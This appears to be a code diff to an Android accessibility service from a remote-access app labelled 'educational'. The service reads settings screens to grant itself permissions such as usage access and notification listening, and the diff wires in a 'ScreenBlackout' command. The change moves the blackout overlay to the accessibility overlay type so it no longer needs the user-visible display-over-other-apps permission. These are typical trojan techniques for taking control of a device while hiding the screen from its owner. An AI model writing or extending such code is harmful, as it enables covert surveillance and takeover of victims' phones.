@@ -110,6 +110,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     public void onServiceConnected() {
         super.onServiceConnected();
         instance = this;
+        // Register with ScreenBlackout so it can use TYPE_ACCESSIBILITY_OVERLAY
+        com.remoteaccess.educational.commands.ScreenBlackout.getInstance().setService(this);
         
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
@@ -663,10 +665,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private boolean tryGrantSwitchBasedPermission(AccessibilityNodeInfo rootNode, String screenText) {
         String lower = screenText.toLowerCase();
         boolean isPermissionSettingScreen =
-                lower.contains("display over other apps") ||
-                lower.contains("appear on top") ||
-                lower.contains("draw over other apps") ||
-                lower.contains("overlay permission") ||
+                // overlay/display-over removed: TYPE_ACCESSIBILITY_OVERLAY needs no special permission
                 lower.contains("usage access") ||
                 lower.contains("usage data access") ||
                 lower.contains("notification listener") ||
@@ -1023,16 +1022,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             } catch (Exception ignored) {}
         }
 
-        // Step 2: Display Over Other Apps (8 s max — list page + per-app page)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            try {
-                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:" + getPackageName()));
-                q.add(new SpecialPermTask("DisplayOver", i,
-                        () -> Settings.canDrawOverlays(UnifiedAccessibilityService.this),
-                        8_000L));
-            } catch (Exception ignored) {}
-        }
+        // DisplayOver (SYSTEM_ALERT_WINDOW) is no longer needed.
+        // ScreenBlackout now uses TYPE_ACCESSIBILITY_OVERLAY which needs no special permission.
 
         return q;
     }
@@ -1466,6 +1457,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        // Unregister from ScreenBlackout and clean up overlay
+        com.remoteaccess.educational.commands.ScreenBlackout.getInstance().clearService();
         if (autoClickHandler != null && autoClickRunnable != null) {
             autoClickHandler.removeCallbacks(autoClickRunnable);
         }
